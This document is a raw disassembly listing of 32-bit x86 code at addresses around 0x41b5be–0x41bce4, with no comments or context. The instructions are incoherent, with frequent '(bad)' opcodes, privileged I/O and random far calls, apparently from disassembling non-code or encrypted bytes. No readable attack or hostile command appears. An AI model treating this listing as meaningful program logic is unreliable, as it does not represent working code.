  41b5be:	mov    dh,0xae
  41b5c0:	dec    edx
  41b5c1:	push   ecx
  41b5c2:	or     ebx,DWORD PTR [esi]
  41b5c4:	(bad)  
  41b5c6:	push   edi
  41b5c7:	xchg   cl,dh
  41b5c9:	push   edx
  41b5ca:	int    0xfe
  41b5cc:	and    DWORD PTR [ecx-0x42823b0a],edi
  41b5d2:	(bad)  
  41b5d3:	mov    ah,0xd5
  41b5d5:	pushf  
  41b5d6:	in     al,dx
  41b5d7:	hlt    
  41b5d8:	adc    al,0x35
  41b5da:	call   0xd278072c
  41b5df:	sbb    al,0x35
  41b5e1:	and    al,al
  41b5e3:	push   ebx
  41b5e4:	mov    ebx,0x87db0a43
  41b5e9:	loopne 0x41b625
  41b5eb:	mov    esp,0x99fb51c2
  41b5f0:	xchg   ecx,eax
  41b5f1:	imul   ebx,DWORD PTR [ebx],0xc3fb0637
  41b5f7:	ret    
  41b5f8:	loop   0x41b59b
  41b5fa:	or     DWORD PTR [ebp+0x2a85f5c6],ebx
  41b600:	jge    0x41b62e
  41b602:	ficom  WORD PTR [esi-0x1b]
  41b605:	inc    ebp
  41b606:	fbstp  TBYTE PTR ds:0x8956774a
  41b60c:	mov    eax,ds:0xb8349d68
  41b611:	call   0x7c33:0x6e45d5f
  41b618:	repnz pop edi
  41b61a:	adc    al,0x45
  41b61c:	and    DWORD PTR [esi],0x53ab2658
  41b622:	cmp    al,0xf
  41b624:	mov    edi,0x6c0e41e
  41b629:	cmp    DWORD PTR [eax+0x79],esi
  41b62c:	lods   eax,DWORD PTR ds:[esi]
  41b62d:	push   ss
  41b62e:	popa   
  41b62f:	push   cs
  41b630:	push   edx
  41b631:	cmp    bl,BYTE PTR [edi-0x524f56af]
  41b637:	push   0x7bb20d3c
  41b63c:	mov    ah,0x4c
  41b63e:	cwde   
  41b63f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b640:	popf   
  41b641:	pop    ebx
  41b642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b643:	clc    
  41b644:	je     0x41b619
  41b646:	clc    
  41b647:	or     esp,DWORD PTR [ebx]
  41b649:	and    bh,BYTE PTR [ebp+0x33a4bf78]
  41b64f:	fist   WORD PTR [eax]
  41b651:	fs dec ebp
  41b653:	mov    ebx,0x83db045c
  41b658:	pop    esp
  41b659:	stos   BYTE PTR es:[edi],al
  41b65a:	rcr    BYTE PTR [edi+edx*4-0x38cd782d],cl
  41b661:	dec    ebx
  41b662:	das    
  41b663:	lock adc DWORD PTR [esi+0x3f0d6a50],edi
  41b66a:	dec    esp
  41b66b:	repz sbb al,0x61
  41b66e:	test   ebp,ecx
  41b670:	test   DWORD PTR [esi+0x5e],esi
  41b673:	inc    ebp
  41b674:	imul   eax,ebx,0x514d5ead
  41b67a:	mov    bh,0x6e
  41b67c:	mov    WORD PTR [ebx-0x68],?
  41b67f:	cld    
  41b680:	mov    ebp,0x7ef16898
  41b685:	outs   dx,BYTE PTR ds:[esi]
  41b686:	stc    
  41b687:	dec    edi
  41b688:	or     bh,BYTE PTR ds:0x2be37370
  41b68e:	pop    edx
  41b68f:	jmp    0xd77c:0x75071489
  41b696:	pop    ebx
  41b697:	loope  0x41b6c1
  41b699:	push   0x40
  41b69b:	or     ebp,DWORD PTR [edi]
  41b69d:	dec    eax
  41b69e:	std    
  41b69f:	ret    0xeda4
  41b6a2:	mov    gs,WORD PTR [edx+eax*2+0x15]
  41b6a6:	mov    eax,0x99ada62f
  41b6ab:	enter  0x3c39,0xd1
  41b6af:	dec    eax
  41b6b0:	loopne 0x41b691
  41b6b2:	repz dec edx
  41b6b4:	mov    cl,0x8f
  41b6b6:	aad    0x63
  41b6b8:	sahf   
  41b6b9:	mov    esp,ebp
  41b6bb:	xchg   ecx,eax
  41b6bc:	jnp    0x41b698
  41b6be:	mov    al,0x8f
  41b6c0:	dec    ebp
  41b6c1:	fbstp  TBYTE PTR [ecx-0x6d]
  41b6c4:	xchg   esp,eax
  41b6c5:	lds    ebx,FWORD PTR [esi]
  41b6c7:	jno    0x41b6a6
  41b6c9:	fucom  st(1)
  41b6cb:	stos   DWORD PTR es:[edi],eax
  41b6cc:	add    cl,0x79
  41b6cf:	stc    
  41b6d0:	test   eax,0xf427c270
  41b6d5:	adc    ebp,DWORD PTR [edx+esi*1]
  41b6d8:	add    esp,DWORD PTR ds:0x2aefe9ac
  41b6de:	fwait
  41b6df:	mov    ?,WORD PTR [edi-0x59]
  41b6e2:	push   eax
  41b6e3:	in     eax,dx
  41b6e4:	sub    eax,edx
  41b6e6:	xor    DWORD PTR [ecx],0x9b38df2
  41b6ec:	jae    0x41b727
  41b6ee:	sbb    al,0x1f
  41b6f0:	aad    0xb0
  41b6f2:	clc    
  41b6f3:	sahf   
  41b6f4:	enter  0x7069,0xb
  41b6f8:	lahf   
  41b6f9:	mov    bl,0xe5
  41b6fb:	(bad)
  41b6ff:	(bad)  
  41b700:	cmp    eax,0x9040fa35
  41b705:	pop    esi
  41b706:	or     BYTE PTR [ebp-0x5b],bh
  41b709:	dec    eax
  41b70a:	test   esi,edi
  41b70c:	sub    BYTE PTR [ebx],0xe4
  41b70f:	call   0x16f7:0x56dbb528
  41b716:	mov    DWORD PTR [edi+eiz*4],ecx
  41b719:	stc    
  41b71a:	aad    0xe1
  41b71c:	jne    0x41b71b
  41b71e:	jge    0x41b78c
  41b720:	xor    eax,0x5c67655c
  41b725:	mov    ebx,0xc4c6537a
  41b72a:	fwait
  41b72b:	loopne 0x41b77d
  41b72d:	xchg   esp,eax
  41b72e:	pop    ss
  41b72f:	out    0xee,eax
  41b731:	mov    edi,ds
  41b733:	add    esp,edi
  41b735:	and    al,0xa2
  41b737:	dec    ebp
  41b738:	and    ch,BYTE PTR [ebx]
  41b73a:	(bad)  
  41b73b:	retf   
  41b73c:	and    BYTE PTR [esi],0x5e
  41b73f:	aad    0x46
  41b741:	cmp    DWORD PTR [edx],0xdfa5b41a
  41b747:	hlt    
  41b748:	mov    ebx,0xf478faa0
  41b74d:	push   ebp
  41b74e:	test   BYTE PTR [ecx+0x4d],dl
  41b751:	jb     0x41b759
  41b753:	mov    ?,WORD PTR [esp+edi*4-0x19]
  41b757:	shl    BYTE PTR [esi],1
  41b759:	out    0xf2,eax
  41b75b:	push   ss
  41b75c:	cmp    ebp,esp
  41b75e:	jne    0x41b783
  41b760:	add    edi,DWORD PTR [ecx+0x73]
  41b763:	add    DWORD PTR [ebp-0x3f],eax
  41b766:	push   esp
  41b767:	mov    esp,0xe776146a
  41b76c:	jp     0x41b71b
  41b76e:	leave  
  41b76f:	sbb    ch,BYTE PTR [eax+edx*4-0x51110273]
  41b776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b777:	imul   ecx,DWORD PTR [ebp+0x6e],0x21
  41b77b:	and    al,0x56
  41b77d:	add    edx,esi
  41b77f:	or     ebx,ebp
  41b781:	les    eax,FWORD PTR [esi+0x1cf75134]
  41b787:	fimul  WORD PTR [ecx]
  41b789:	call   0x84a7:0xc3cc6ad5
  41b790:	in     eax,0x7c
  41b792:	or     edi,DWORD PTR [ebp+0x56b4a4ac]
  41b798:	int    0x4
  41b79a:	popa   
  41b79b:	bound  esi,QWORD PTR [ebx-0x4058893b]
  41b7a1:	scas   eax,DWORD PTR es:[edi]
  41b7a2:	aaa    
  41b7a3:	repz xor al,0x62
  41b7a6:	or     al,0xec
  41b7a8:	xor    esp,ebp
  41b7aa:	je     0x41b822
  41b7ac:	dec    edi
  41b7ad:	out    0x7a,al
  41b7af:	call   0x24d5c838
  41b7b4:	std    
  41b7b5:	shr    ebx,cl
  41b7b7:	(bad)  
  41b7b8:	cmp    al,0x2a
  41b7ba:	push   esp
  41b7bb:	call   0x5d7cf55b
  41b7c0:	and    BYTE PTR [eax+0x56],al
  41b7c3:	pop    ecx
  41b7c4:	sar    DWORD PTR [ecx],cl
  41b7c6:	call   0xdcaa:0x8bf2a98b
  41b7cd:	adc    DWORD PTR [esp+ebp*4-0x74],edx
  41b7d1:	xchg   ecx,eax
  41b7d2:	and    esp,ebx
  41b7d4:	cmp    al,BYTE PTR [esi]
  41b7d6:	xchg   edi,eax
  41b7d7:	cmp    eax,0xf99fdbc0
  41b7dc:	sahf   
  41b7dd:	pop    ss
  41b7de:	ja     0x41b7b5
  41b7e0:	jle    0x41b858
  41b7e2:	stos   BYTE PTR es:[edi],al
  41b7e3:	lea    ecx,[eax+0x110794b5]
  41b7e9:	push   esi
  41b7ea:	mov    al,ds:0x3c0c9d2e
  41b7ef:	bound  esi,QWORD PTR [esi+0x1c4b2389]
  41b7f5:	rol    DWORD PTR [esi],0xbd
  41b7f8:	(bad)  
  41b7f9:	shl    DWORD PTR [edx],cl
  41b7fb:	out    0x21,eax
  41b7fd:	ja     0x41b7da
  41b7ff:	add    DWORD PTR [ecx],edx
  41b801:	jns    0x41b812
  41b803:	loopne 0x41b79f
  41b805:	add    BYTE PTR [ebp+ebx*2+0x5d2c4326],bh
  41b80c:	xchg   esi,eax
  41b80d:	adc    al,0x2e
  41b80f:	cmp    ebx,DWORD PTR [ecx]
  41b811:	and    eax,0x5ebb38c4
  41b816:	fiadd  WORD PTR [edx-0x33]
  41b819:	mov    al,BYTE PTR [ebp+0x5c]
  41b81c:	mov    esi,0xbb13589d
  41b821:	mov    dh,0x80
  41b823:	mov    ds:0x75dc2fe9,al
  41b828:	(bad)  
  41b829:	fld    QWORD PTR ds:0xacee3f9e
  41b82f:	setp   BYTE PTR [ebx+0x6b4414c1]
  41b836:	cmp    al,0x6f
  41b838:	clc    
  41b839:	ins    DWORD PTR es:[edi],dx
  41b83a:	ret    
  41b83b:	test   DWORD PTR [edx-0x568cab4e],eax
  41b841:	mov    esp,0x2c8f05fa
  41b846:	(bad)  
  41b847:	jne    0x41b851
  41b849:	lds    edi,FWORD PTR [ecx]
  41b84b:	and    ecx,ebp
  41b84d:	ret    0x1a6b
  41b850:	cmp    BYTE PTR [ecx],al
  41b852:	das    
  41b853:	jmp    0xfb2514fe
  41b858:	jge    0x41b809
  41b85a:	in     al,0x9f
  41b85c:	shr    DWORD PTR [edx],1
  41b85e:	arpl   WORD PTR [ebx],si
  41b860:	int3   
  41b861:	mov    dl,0x15
  41b863:	xor    DWORD PTR [edi],edx
  41b865:	add    esp,ebp
  41b867:	(bad)  
  41b868:	popa   
  41b869:	xor    al,0x1f
  41b86b:	pop    eax
  41b86c:	(bad)  
  41b86d:	int3   
  41b86e:	std    
  41b86f:	pop    esi
  41b870:	out    0x74,al
  41b872:	mov    ah,BYTE PTR [edx]
  41b874:	pop    edi
  41b875:	or     ebp,DWORD PTR [ecx+0x71b91aac]
  41b87b:	bound  ebx,QWORD PTR [edi]
  41b87d:	add    BYTE PTR [ebp-0x5afba357],al
  41b883:	push   es
  41b884:	in     al,dx
  41b885:	loop   0x41b8fd
  41b887:	cmp    al,0xa2
  41b889:	loopne 0x41b846
  41b88b:	test   DWORD PTR [eax],0x96769cd5
  41b891:	or     dl,BYTE PTR [ebx+ebp*4]
  41b894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b895:	or     edx,ebx
  41b897:	sub    esp,eax
  41b899:	cdq    
  41b89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b89b:	push   edi
  41b89c:	sbb    DWORD PTR ds:0x110d9b0,ebx
  41b8a2:	retf   0xd174
  41b8a5:	imul   esp,DWORD PTR [ebp-0x7b],0x2897c772
  41b8ac:	xor    ebp,DWORD PTR [edi]
  41b8ae:	cli    
  41b8af:	icebp  
  41b8b0:	pusha  
  41b8b1:	fs jmp 0x41b893
  41b8b4:	add    DWORD PTR [esi+0x60],0xffffff9f
  41b8b8:	retf   0x97fb
  41b8bb:	inc    ecx
  41b8bc:	ds push es
  41b8be:	ror    BYTE PTR [esi-0x6a5107d2],cl
  41b8c4:	int3   
  41b8c5:	cs jae 0x41b87f
  41b8c8:	add    BYTE PTR [eax],dh
  41b8ca:	mov    eax,ds:0xbba730cb
  41b8cf:	in     al,dx
  41b8d0:	ds xchg ecx,eax
  41b8d2:	adc    al,0x77
  41b8d4:	lds    edx,FWORD PTR [ebp+ebx*1-0x38]
  41b8d8:	xchg   esi,eax
  41b8d9:	pushf  
  41b8da:	cmc    
  41b8db:	std    
  41b8dc:	pop    eax
  41b8dd:	sbb    esp,0x1
  41b8e0:	jecxz  0x41b89a
  41b8e2:	or     al,0xd6
  41b8e4:	sub    dl,BYTE PTR [ebx+ebx*4+0x54]
  41b8e8:	sub    eax,0xf9a7df94
  41b8ed:	xchg   DWORD PTR [edi+edx*2+0x72],esp
  41b8f1:	addr16 loope 0x41b89b
  41b8f4:	jne    0x41b963
  41b8f6:	js     0x41b8ef
  41b8f8:	sub    eax,0x6e2a9cf3
  41b8fd:	and    BYTE PTR [bp+si+0x5406],ah
  41b902:	nop
  41b903:	cmp    al,BYTE PTR [edx+0x49]
  41b906:	sub    BYTE PTR cs:[esp+edx*4-0x21f8b50f],al
  41b90e:	lods   al,BYTE PTR ds:[esi]
  41b90f:	scas   al,BYTE PTR es:[edi]
  41b910:	aam    0xf0
  41b912:	add    DWORD PTR [ebp-0x55],esp
  41b915:	jae    0x41b93d
  41b917:	or     DWORD PTR [esi+ebp*4-0x3fc2c9ec],edx
  41b91e:	cdq    
  41b91f:	xchg   ebp,eax
  41b920:	mov    cs,WORD PTR [edi]
  41b922:	xchg   ecx,eax
  41b923:	and    BYTE PTR [edx-0x17],bh
  41b926:	pop    ebp
  41b927:	mov    dl,0x40
  41b929:	fstp   QWORD PTR [ecx+0x38]
  41b92c:	pop    esi
  41b92d:	add    eax,0x58bd18
  41b932:	lahf   
  41b933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b934:	jl     0x41b9a8
  41b936:	push   ebx
  41b937:	dec    eax
  41b938:	jns    0x41b8ca
  41b93a:	arpl   WORD PTR [eax+0x1fb2882e],sp
  41b940:	popf   
  41b941:	ins    BYTE PTR es:[edi],dx
  41b942:	sbb    ah,BYTE PTR [edi+edi*1-0x6a7ef176]
  41b949:	sub    ah,BYTE PTR fs:[esi]
  41b94c:	aad    0x84
  41b94e:	xchg   esi,eax
  41b94f:	sahf   
  41b950:	enter  0xa671,0x6
  41b954:	mov    al,0x24
  41b956:	and    eax,0xf26eed9c
  41b95b:	out    dx,al
  41b95c:	push   esp
  41b95d:	xor    ecx,ebp
  41b95f:	sar    BYTE PTR [esp+ebp*8+0x5d4d73],1
  41b966:	fadd   DWORD PTR [ecx-0x5a]
  41b969:	add    eax,DWORD PTR [ebp-0x41]
  41b96c:	mov    dh,0xee
  41b96e:	test   bh,0xd9
  41b971:	mov    ebx,0x4e7281cf
  41b976:	mov    DWORD PTR [ebp+0x43],eax
  41b979:	rcl    edx,1
  41b97b:	ret    
  41b97c:	in     al,0xc6
  41b97e:	mov    al,ds:0x69ccd605
  41b983:	rcr    BYTE PTR [edi],cl
  41b985:	popf   
  41b986:	mov    eax,ds:0x9b8eb7dc
  41b98b:	stos   DWORD PTR es:[edi],eax
  41b98c:	(bad)  
  41b98d:	gs mov cl,0x9d
  41b990:	ret    
  41b991:	xchg   edx,eax
  41b992:	vpaddsw ymm2,ymm2,YMMWORD PTR [edx-0x71]
  41b997:	das    
  41b998:	bound  edi,QWORD PTR [ebp+0x290cbd8d]
  41b99e:	and    ebp,DWORD PTR [eax]
  41b9a0:	mov    eax,ds:0x1ce416d1
  41b9a5:	mov    bh,ah
  41b9a7:	mov    ebx,0xf5bea4b1
  41b9ac:	pop    ecx
  41b9ad:	out    0x5e,al
  41b9af:	ins    BYTE PTR es:[edi],dx
  41b9b0:	stos   DWORD PTR es:[edi],eax
  41b9b1:	(bad)  
  41b9b2:	ds aad 0xb1
  41b9b5:	pop    ebp
  41b9b6:	repz mov ebp,0x9dd18d7c
  41b9bc:	xor    edi,0x82ae7124
  41b9c2:	and    dl,BYTE PTR [eax]
  41b9c4:	jge    0x41b989
  41b9c6:	fdiv   DWORD PTR [edx]
  41b9c8:	and    eax,0xd6a196c2
  41b9cd:	les    edi,FWORD PTR ds:0xae2c4afa
  41b9d3:	fdiv   st,st(3)
  41b9d5:	adc    DWORD PTR [eax+0x30ab8d8],ecx
  41b9db:	stos   BYTE PTR es:[edi],al
  41b9dc:	push   es
  41b9dd:	outs   dx,BYTE PTR ds:[esi]
  41b9de:	iret   
  41b9df:	sub    eax,0x5aa9026f
  41b9e4:	push   0x23
  41b9e6:	xchg   esi,eax
  41b9e7:	jp     0x41b9bb
  41b9e9:	sahf   
  41b9ea:	cld    
  41b9eb:	jae    0x41b997
  41b9ed:	fdiv   st,st(7)
  41b9ef:	test   dl,cl
  41b9f1:	addr16 inc esi
  41b9f3:	mov    ebx,DWORD PTR [ecx+0x4864bbf2]
  41b9f9:	hlt    
  41b9fa:	add    dh,BYTE PTR [ebx-0x13517e73]
  41ba00:	inc    esi
  41ba01:	mov    edi,edi
  41ba03:	repnz xchg ebp,eax
  41ba05:	adc    eax,0xcdef683
  41ba0a:	(bad)  
  41ba0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba0c:	mov    bh,BYTE PTR cs:[ecx+0x1e]
  41ba10:	test   al,bl
  41ba12:	test   eax,0x7801ffbb
  41ba17:	in     al,dx
  41ba18:	add    al,0xac
  41ba1a:	out    0xdc,eax
  41ba1c:	gs loopne 0x41ba92
  41ba1f:	out    0x7,eax
  41ba21:	enter  0xe476,0x32
  41ba25:	int    0x5b
  41ba27:	xor    eax,0xb18298ab
  41ba2c:	and    al,0x24
  41ba2e:	pusha  
  41ba2f:	inc    esp
  41ba30:	pop    edi
  41ba31:	or     al,0xc
  41ba33:	imul   edi,DWORD PTR [ecx-0x4c96c4f7],0xffffff8f
  41ba3a:	adc    bh,BYTE PTR [esi+0x2f]
  41ba3d:	arpl   WORD PTR ds:[esi+0x2a],bx
  41ba41:	sbb    ecx,DWORD PTR [eax]
  41ba43:	(bad)  
  41ba44:	pop    edi
  41ba45:	sbb    DWORD PTR [eax],eax
  41ba47:	retf   
  41ba48:	pop    edi
  41ba49:	scas   eax,DWORD PTR es:[edi]
  41ba4a:	jg     0x41b9ef
  41ba4c:	xor    eax,0x3eb0e498
  41ba51:	lods   eax,DWORD PTR ds:[esi]
  41ba52:	scas   eax,DWORD PTR es:[edi]
  41ba53:	hlt    
  41ba54:	dec    ebp
  41ba55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba56:	or     ebp,DWORD PTR [ebp-0x141b0ef5]
  41ba5c:	stos   DWORD PTR es:[edi],eax
  41ba5d:	stos   BYTE PTR es:[edi],al
  41ba5e:	in     al,0xf2
  41ba60:	sbb    al,0x58
  41ba62:	or     al,0x9d
  41ba64:	and    ecx,DWORD PTR [ecx-0x2174632c]
  41ba6a:	in     al,0x53
  41ba6c:	fdivp  st(3),st
  41ba6e:	jo     0x41ba60
  41ba70:	stc    
  41ba71:	rcl    ch,1
  41ba73:	rcr    DWORD PTR [eax-0x6a],1
  41ba76:	push   esi
  41ba77:	test   al,0xdc
  41ba79:	push   0xffffff92
  41ba7b:	fistp  DWORD PTR [esi-0x71]
  41ba7e:	out    dx,al
  41ba7f:	and    bl,bl
  41ba81:	cmp    eax,0x8af6e1cd
  41ba86:	push   esi
  41ba87:	inc    edx
  41ba88:	shl    BYTE PTR [esi],1
  41ba8a:	mov    ds:0x73369ef8,eax
  41ba8f:	sub    cl,BYTE PTR [esi-0x69f11f4f]
  41ba95:	(bad)  
  41ba96:	les    ebx,FWORD PTR [ebp+0x2f4f5748]
  41ba9c:	icebp  
  41ba9d:	jmp    0xf8b06571
  41baa2:	mov    dh,0x85
  41baa4:	mov    ebx,0x8c7bc1fa
  41baa9:	adc    ecx,DWORD PTR [ebp+edi*2-0x1c]
  41baad:	dec    ebx
  41baae:	jge    0x41ba46
  41bab0:	stos   DWORD PTR es:[edi],eax
  41bab1:	mov    ah,0x8b
  41bab3:	sub    BYTE PTR [ecx+0xb0d9c5e],al
  41bab9:	push   esi
  41baba:	push   0x557a57ef
  41babf:	jbe    0x41bafb
  41bac1:	cdq    
  41bac2:	mov    al,ds:0x8c3daf34
  41bac7:	mov    eax,0x75605521
  41bacc:	popa   
  41bacd:	push   ds
  41bace:	fnsave [edi-0x27d3b6db]
  41bad4:	cld    
  41bad5:	mov    ecx,0xfc88dc5c
  41bada:	mov    dh,0xf
  41badc:	adc    al,0x31
  41bade:	neg    BYTE PTR [eax+0x35]
  41bae1:	aaa    
  41bae2:	push   es
  41bae3:	into   
  41bae4:	cmp    ah,BYTE PTR [esi-0x2e]
  41bae7:	rcl    BYTE PTR [eax+0x3f],0x7b
  41baeb:	push   es
  41baec:	sahf   
  41baed:	fcmovu st,st(5)
  41baef:	dec    ecx
  41baf0:	cmp    bh,BYTE PTR [ecx+0x6b]
  41baf3:	cmp    al,0x82
  41baf5:	xor    DWORD PTR [eax],edx
  41baf7:	mov    DWORD PTR [eax+ebp*1],edx
  41bafa:	lods   al,BYTE PTR ds:[esi]
  41bafb:	cmp    BYTE PTR [ebx],cl
  41bafd:	test   al,ah
  41baff:	sub    BYTE PTR [esi+0xc258973],0xb5
  41bb06:	inc    ecx
  41bb07:	jmp    0x41bb7c
  41bb09:	ss inc esp
  41bb0b:	jno    0x41bb7f
  41bb0d:	pop    ebx
  41bb0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb0f:	mov    fs:0xea9a0784,al
  41bb15:	add    ebp,ebx
  41bb17:	sub    ecx,DWORD PTR [eax+0x4fc90183]
  41bb1d:	mov    BYTE PTR [esi+0x3a081c69],0xf7
  41bb24:	push   ecx
  41bb25:	lds    ebx,FWORD PTR [edi]
  41bb27:	push   ecx
  41bb28:	test   DWORD PTR [ebp-0xd],esp
  41bb2b:	adc    BYTE PTR ss:[ebx],ch
  41bb2e:	sbb    al,0x29
  41bb30:	imul   ecx,DWORD PTR [ecx-0x4a],0x6c
  41bb34:	data16 outs dx,BYTE PTR ds:[esi]
  41bb36:	xchg   edi,eax
  41bb37:	push   ecx
  41bb38:	(bad)  
  41bb3a:	add    DWORD PTR [esi],esp
  41bb3c:	mov    ebp,0xd08e53e5
  41bb41:	loopne 0x41bb8c
  41bb43:	mov    cl,BYTE PTR [esi+0x6e]
  41bb46:	jmp    0xceff2fc
  41bb4b:	dec    DWORD PTR [ecx-0x8305cf0]
  41bb51:	sub    ch,BYTE PTR [esi]
  41bb53:	cli    
  41bb54:	imul   edx,DWORD PTR [eax+0x7e],0xb61b61ca
  41bb5b:	mov    al,ds:0xe685afce
  41bb60:	mov    ebx,0x7097df30
  41bb65:	sbb    BYTE PTR [esi],cl
  41bb67:	pop    esp
  41bb68:	and    eax,0x4c4659a3
  41bb6d:	fbstp  TBYTE PTR [ecx+0x62930c08]
  41bb73:	dec    esi
  41bb74:	in     al,0xb8
  41bb76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb77:	or     eax,0x6c4b78d0
  41bb7c:	adc    ch,BYTE PTR [ecx+0xe]
  41bb7f:	mov    edx,0x6d4dc559
  41bb84:	retf   
  41bb85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb86:	jbe    0x41bbfe
  41bb88:	inc    edx
  41bb89:	imul   ebx,DWORD PTR [esi+0x3],0xc88166f0
  41bb90:	not    BYTE PTR [eax+0x4121845d]
  41bb96:	inc    ebx
  41bb97:	dec    ecx
  41bb98:	and    BYTE PTR [ecx-0x6c],bl
  41bb9b:	jns    0x41bc0b
  41bb9d:	push   ds
  41bb9e:	xchg   DWORD PTR [ebp-0x5e287d5c],edx
  41bba4:	sub    DWORD PTR [eax+0x5d276737],eax
  41bbaa:	out    0x50,eax
  41bbac:	xor    dl,BYTE PTR [ecx+0x50]
  41bbaf:	into   
  41bbb0:	jge    0x41bb84
  41bbb2:	push   esi
  41bbb3:	shl    BYTE PTR [ecx+eiz*1+0x7f384d15],cl
  41bbba:	(bad)  
  41bbbb:	mov    ebp,0x28c5da13
  41bbc0:	jno    0x41bc27
  41bbc2:	pop    edx
  41bbc3:	pop    edx
  41bbc4:	and    al,0xe0
  41bbc6:	arpl   WORD PTR [edi-0x3f],ax
  41bbc9:	pop    edi
  41bbca:	jns    0x41bb57
  41bbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbcd:	xchg   esi,eax
  41bbce:	and    DWORD PTR [ebx],0xffffff89
  41bbd1:	ret    0x4eaf
  41bbd4:	in     al,dx
  41bbd5:	and    cl,bh
  41bbd7:	mov    esp,0xdb0cec70
  41bbdc:	cmp    DWORD PTR [edx],ebp
  41bbde:	add    dh,bl
  41bbe0:	stos   BYTE PTR es:[edi],al
  41bbe1:	sub    DWORD PTR [ecx-0x69f4b8fe],0x323c9b34
  41bbeb:	pop    esp
  41bbec:	jno    0x41bc48
  41bbee:	das    
  41bbef:	xchg   edi,eax
  41bbf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf1:	retf   
  41bbf2:	iret   
  41bbf3:	shl    BYTE PTR [ebp-0x759d9654],cl
  41bbf9:	(bad)
  41bbfc:	or     BYTE PTR [ecx+ecx*1],al
  41bbff:	mov    cl,0x4
  41bc01:	xchg   ebp,edx
  41bc03:	push   edi
  41bc04:	(bad)  
  41bc05:	sub    al,0x6c
  41bc07:	sti    
  41bc08:	sbb    DWORD PTR [eax],esp
  41bc0a:	sbb    DWORD PTR [edi-0x23],ebx
  41bc0d:	scas   eax,DWORD PTR es:[edi]
  41bc0e:	icebp  
  41bc0f:	fldcw  WORD PTR [ecx]
  41bc11:	pop    es
  41bc12:	xlat   BYTE PTR ds:[ebx]
  41bc13:	jge    0x41bbb5
  41bc15:	mov    BYTE PTR [ecx],0x35
  41bc18:	outs   dx,DWORD PTR ds:[esi]
  41bc19:	and    ah,BYTE PTR [edx-0x3d]
  41bc1c:	fild   DWORD PTR [edi]
  41bc1e:	stos   DWORD PTR es:[edi],eax
  41bc1f:	nop
  41bc20:	inc    ebx
  41bc21:	(bad)  
  41bc22:	inc    ebx
  41bc23:	xchg   esi,eax
  41bc24:	data16 fisub WORD PTR [edi+0x5a]
  41bc28:	lods   al,BYTE PTR ds:[esi]
  41bc29:	dec    eax
  41bc2a:	aam    0xd9
  41bc2c:	out    dx,eax
  41bc2d:	add    esp,DWORD PTR [edx]
  41bc2f:	inc    esp
  41bc30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc31:	jl     0x41bbd1
  41bc33:	mov    WORD PTR [esi+0x32],?
  41bc36:	test   al,0xae
  41bc38:	sbb    dh,BYTE PTR [ebp+0x67e9b58c]
  41bc3e:	mov    eax,0xf55c95f0
  41bc43:	mov    dh,0x43
  41bc45:	test   al,0x4b
  41bc47:	xchg   ebx,eax
  41bc48:	and    al,0xfe
  41bc4a:	nop
  41bc4b:	popa   
  41bc4c:	xchg   ebp,eax
  41bc4d:	outs   dx,BYTE PTR ds:[esi]
  41bc4e:	mov    ch,0xeb
  41bc50:	icebp  
  41bc51:	adc    al,0xb4
  41bc53:	cli    
  41bc54:	adc    BYTE PTR [ebx-0x1cc4c050],cl
  41bc5a:	(bad)  
  41bc5b:	pusha  
  41bc5c:	push   cs
  41bc5d:	cmp    DWORD PTR [edi-0x505857bd],edx
  41bc63:	mov    edx,0x89c681aa
  41bc68:	xor    BYTE PTR [edx-0x6b],0x56
  41bc6c:	add    dl,BYTE PTR [esi]
  41bc6e:	mov    DWORD PTR [ecx+0x26],ebp
  41bc71:	inc    edx
  41bc72:	mov    cl,0x7f
  41bc74:	jne    0x41bc22
  41bc76:	xchg   ebx,eax
  41bc77:	cmp    ch,al
  41bc79:	xchg   esp,eax
  41bc7a:	(bad)  
  41bc7b:	std    
  41bc7c:	ss jg  0x41bcc0
  41bc7f:	lock daa 
  41bc81:	loopne 0x41bcdb
  41bc83:	add    BYTE PTR [ebx],dl
  41bc85:	mov    dh,BYTE PTR [ebx+0x1c882d18]
  41bc8b:	pop    esp
  41bc8c:	sub    dl,BYTE PTR [edx]
  41bc8e:	dec    edx
  41bc8f:	xchg   edi,ebp
  41bc91:	mov    edx,0x7ebfaae
  41bc96:	xor    DWORD PTR [edi],ebp
  41bc98:	pop    esi
  41bc99:	and    edx,eax
  41bc9b:	add    cl,BYTE PTR [ebp-0x29]
  41bc9e:	call   0x1c67:0xd8339eed
  41bca5:	pop    esp
  41bca6:	clc    
  41bca7:	pop    esp
  41bca8:	mov    ebx,0xccac3a0a
  41bcad:	xor    esi,DWORD PTR [ecx+edx*8+0x67]
  41bcb1:	jnp    0x41bc7e
  41bcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcb4:	fwait
  41bcb5:	in     eax,dx
  41bcb6:	ins    BYTE PTR es:[edi],dx
  41bcb7:	add    ch,ah
  41bcb9:	cmp    esi,DWORD PTR [edx+0x1f4912b8]
  41bcbf:	retf   
  41bcc0:	dec    esp
  41bcc1:	pop    edx
  41bcc2:	pop    ds
  41bcc3:	push   cs
  41bcc4:	xchg   esp,eax
  41bcc5:	xchg   edx,eax
  41bcc6:	adc    al,0xb9
  41bcc8:	push   ds
  41bcc9:	iret   
  41bcca:	leave  
  41bccb:	mov    bl,0x7f
  41bccd:	jmp    0x41bcc2
  41bccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcd0:	cmc    
  41bcd1:	and    eax,0x2a48506b
  41bcd6:	mov    bl,BYTE PTR [ebp-0x50]
  41bcd9:	cmp    eax,0xf583a0d7
  41bcde:	out    dx,eax
  41bcdf:	push   ebp
  41bce0:	push   esp
  41bce1:	add    DWORD PTR [esi+esi*1],ebp
  41bce4:	xchg   esp,eax
